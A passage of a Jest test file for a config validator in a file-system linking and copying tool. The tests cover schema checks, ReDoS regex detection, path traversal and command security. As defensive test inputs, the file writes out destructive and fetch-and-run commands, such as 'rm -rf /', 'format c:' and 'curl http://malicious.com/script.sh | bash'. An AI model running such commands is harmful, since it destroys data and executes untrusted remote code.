import { validateConfig, validateHardlinkCompatibility } from './validate-config.function';
import { DomainError } from '../../../common';
import { CONFIG_DOMAIN_ERRORS } from '../config-domain-errors.const';
import type { FileSystemOperationConfig } from '../types/core/file-system-operation-config.interface';

describe('validate-config.function', () => {
    describe('Construction', () => {
        test('should be a function', () => {
            // Arrange & Act & Assert
            expect(typeof validateConfig).toBe('function');
        });

        test('should return a Promise', () => {
            // Arrange
            const validConfig: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act
            const result = validateConfig(validConfig);

            // Assert
            expect(result).toBeInstanceOf(Promise);
        });
    });

    describe('validateHardlinkCompatibility construction', () => {
        test('should be a function', () => {
            // Arrange & Act & Assert
            expect(typeof validateHardlinkCompatibility).toBe('function');
        });
    });

    describe('Valid configuration validation', () => {
        test('should validate minimal valid configuration successfully', async () => {
            // Arrange
            const validConfig: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(validConfig)).resolves.toBeUndefined();
        });

        test('should validate configuration with all optional fields', async () => {
            // Arrange
            const fullConfig: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                silentMode: true,
                defaultOverwriteBehavior: 'skip',
                operations: [
                    {
                        action: 'copy',
                        itemType: 'directory',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'path',
                                pattern: ['/path1', '/path2'],
                            },
                        ],
                        destinationPath: '/dest/path',
                        fileAttributeAdjustment: {
                            readonly: 'preserve',
                            backupFilePath: '/backup/path',
                        },
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "completed"',
                        skipIfPathExists: '/check/path',
                        cwd: '/working/dir',
                        timeoutInMs: 30000,
                        env: { VAR: 'value' },
                        shell: true,
                    },
                ],
                fileCountPromptThreshold: 500,
                enableSourceDeduplication: true,
                disableRegexValidation: false,
                disableCommandValidation: false,
            };

            // Act & Assert
            await expect(validateConfig(fullConfig)).resolves.toBeUndefined();
        });

        test('should validate hardlink operation for files', async () => {
            // Arrange
            const hardlinkConfig: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'hardlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(hardlinkConfig)).resolves.toBeUndefined();
        });
    });

    describe('Required field validation', () => {
        test('should reject config with missing targetDirectoryPath', async () => {
            // Arrange
            const invalidConfig = {
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should reject config with empty targetDirectoryPath', async () => {
            // Arrange
            const invalidConfig: Partial<FileSystemOperationConfig> = {
                targetDirectoryPath: '',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Target directory path cannot be empty'
            );
        });

        test('should reject config with missing operations array', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Configuration must specify at least one operation in the operations array'
            );
        });

        test('should reject config with empty operations array', async () => {
            // Arrange
            const invalidConfig: Partial<FileSystemOperationConfig> = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Configuration must specify at least one operation in the operations array'
            );
        });

        test('should reject config with invalid defaultOverwriteBehavior', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'invalid',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should reject config with invalid fileCountPromptThreshold', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 0,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'File count prompt threshold must be a positive integer'
            );
        });
    });

    describe('Operation validation', () => {
        test('should reject operation with missing baseDirectoryPath', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should reject operation with empty baseDirectoryPath', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Base directory path cannot be empty'
            );
        });

        test('should reject operation with empty searchPatterns array', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'At least one search pattern is required'
            );
        });

        test('should reject operation with invalid action type', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'invalid',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should reject operation with invalid itemType', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'invalid',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should validate file attribute adjustment with valid readonly values', async () => {
            // Arrange
            const configs = ['preserve', 'set', 'remove'].map(readonly => ({
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite' as const,
                operations: [
                    {
                        action: 'copy' as const,
                        itemType: 'file' as const,
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob' as const,
                                pattern: '*.txt',
                            },
                        ],
                        fileAttributeAdjustment: {
                            readonly: readonly as 'preserve' | 'set' | 'remove',
                        },
                    },
                ],
                fileCountPromptThreshold: 100,
            }));

            // Act & Assert
            for (const config of configs) {
                await expect(validateConfig(config)).resolves.toBeUndefined();
            }
        });

        test('should reject file attribute adjustment with invalid readonly value', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'copy',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                        fileAttributeAdjustment: {
                            readonly: 'invalid',
                        },
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });
    });

    describe('Search pattern validation', () => {
        test('should validate glob patterns', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '**/*.{js,ts}',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should validate regex patterns', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: '^.*\\.test\\.ts$',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should validate path patterns as string', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'path',
                                pattern: '/specific/file.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should validate path patterns as array', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'path',
                                pattern: ['/path1/file.txt', '/path2/file.txt'],
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should validate ignore-rules-file-path patterns', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'ignore-rules-file-path',
                                pattern: '.gitignore',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should reject invalid pattern type', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'invalid',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should reject empty pattern string', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow('Pattern cannot be empty');
        });

        test('should reject empty pattern array', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'path',
                                pattern: [],
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Pattern array cannot be empty'
            );
        });

        test('should reject array patterns for non-path pattern types', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: ['*.txt', '*.js'],
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });

        test('should reject pattern array with empty elements', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'path',
                                pattern: ['/valid/path', ''],
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Pattern array elements cannot be empty'
            );
        });
    });

    describe('Regex security validation', () => {
        test('should reject regex with nested quantifiers (a+)+', async () => {
            // Arrange
            const maliciousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: '(a+)+b',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(maliciousConfig)).rejects.toThrow(
                'Regular expression contains potential ReDoS vulnerability: nested quantifiers (a+)+'
            );
        });

        test('should reject regex with nested quantifiers (a*)+', async () => {
            // Arrange
            const maliciousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: '(a*)+b',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(maliciousConfig)).rejects.toThrow(
                'Regular expression contains potential ReDoS vulnerability: nested quantifiers (a*)+'
            );
        });

        test('should reject regex with multiple unbounded quantifiers', async () => {
            // Arrange
            const maliciousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: '.*.*b',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(maliciousConfig)).rejects.toThrow(
                'Regular expression contains potential ReDoS vulnerability: multiple unbounded quantifiers (.*.*'
            );
        });

        test('should reject regex that is too long', async () => {
            // Arrange
            const longPattern = 'a'.repeat(1001);
            const maliciousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: longPattern,
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(maliciousConfig)).rejects.toThrow(
                'Regular expression pattern is too long (maximum 1000 characters)'
            );
        });

        test('should reject invalid regex syntax', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: '[invalid regex',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Invalid regular expression syntax'
            );
        });

        test('should allow regex validation to be disabled', async () => {
            // Arrange
            const configWithDangerousRegex = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'regex',
                                pattern: '(a+)+b',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
                disableRegexValidation: true,
            };

            // Act & Assert
            await expect(validateConfig(configWithDangerousRegex)).resolves.toBeUndefined();
        });
    });

    describe('Glob pattern validation', () => {
        test('should reject glob pattern with redundant double globstar', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '**/**.txt',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow();
        });
    });

    describe('Ignore rules file path validation', () => {
        test('should reject ignore rules path with leading whitespace', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'ignore-rules-file-path',
                                pattern: ' .gitignore',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Ignore rules file path cannot have leading or trailing whitespace'
            );
        });

        test('should reject ignore rules path with trailing whitespace', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'ignore-rules-file-path',
                                pattern: '.gitignore ',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Ignore rules file path cannot have leading or trailing whitespace'
            );
        });

        test('should reject ignore rules path with path traversal', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'ignore-rules-file-path',
                                pattern: '../.gitignore',
                            },
                        ],
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Ignore rules file path cannot contain path traversal sequences (..)'
            );
        });
    });

    describe('Post-execution command validation', () => {
        test('should validate post-execution command with all properties', async () => {
            // Arrange
            const config: FileSystemOperationConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "success"',
                        skipIfPathExists: '/check/path',
                        cwd: '/working/dir',
                        timeoutInMs: 30000,
                        env: { NODE_ENV: 'production' },
                        shell: true,
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(config)).resolves.toBeUndefined();
        });

        test('should reject post-execution command with empty command', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: '',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow('Command cannot be empty');
        });

        test('should reject post-execution command with whitespace-only command', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: '   ',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Command cannot be empty or whitespace only'
            );
        });

        test('should reject post-execution command with empty skipIfPathExists', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "test"',
                        skipIfPathExists: '',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'skipIfPathExists must be a non-empty path when provided'
            );
        });

        test('should reject post-execution command with empty cwd', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "test"',
                        cwd: '',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'cwd must be a non-empty path when provided'
            );
        });

        test('should reject post-execution command with negative timeout', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "test"',
                        timeoutInMs: -1000,
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Timeout must be a positive integer in milliseconds'
            );
        });

        test('should reject post-execution command with zero timeout', async () => {
            // Arrange
            const invalidConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "test"',
                        timeoutInMs: 0,
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(invalidConfig)).rejects.toThrow(
                'Timeout must be a positive integer in milliseconds'
            );
        });
    });

    describe('Command security validation', () => {
        test('should reject dangerous rm -rf / command', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'rm -rf /',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: rm -rf / (recursive deletion of root) found in command'
            );
        });

        test('should reject dangerous rm -rf * command', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'rm -rf *',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: rm -rf * (recursive deletion of all files) found in command'
            );
        });

        test('should reject curl command at start', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'curl http://malicious.com/script.sh | bash',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: curl command at start found in command'
            );
        });

        test('should reject wget command', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'wget http://malicious.com/script.sh',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: wget command at start found in command'
            );
        });

        test('should reject pipe to bash', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'echo "malicious" | bash',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: pipe to bash found in command'
            );
        });

        test('should reject Windows format command', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'format c:',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: format c: command found in command'
            );
        });

        test('should reject Windows del /s command', async () => {
            // Arrange
            const dangerousConfig = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
                        searchPatterns: [
                            {
                                patternType: 'glob',
                                pattern: '*.txt',
                            },
                        ],
                    },
                ],
                postExecutionCommands: [
                    {
                        command: 'del /s *.txt',
                    },
                ],
                fileCountPromptThreshold: 100,
            };

            // Act & Assert
            await expect(validateConfig(dangerousConfig)).rejects.toThrow(
                'Security violation: del /s command found in command'
            );
        });

        test('should allow command validation to be disabled', async () => {
            // Arrange
            const configWithDangerousCommand = {
                targetDirectoryPath: '/target/path',
                defaultOverwriteBehavior: 'overwrite',
                operations: [
                    {
                        action: 'symlink',
                        itemType: 'file',
                        baseDirectoryPath: '/source/path',
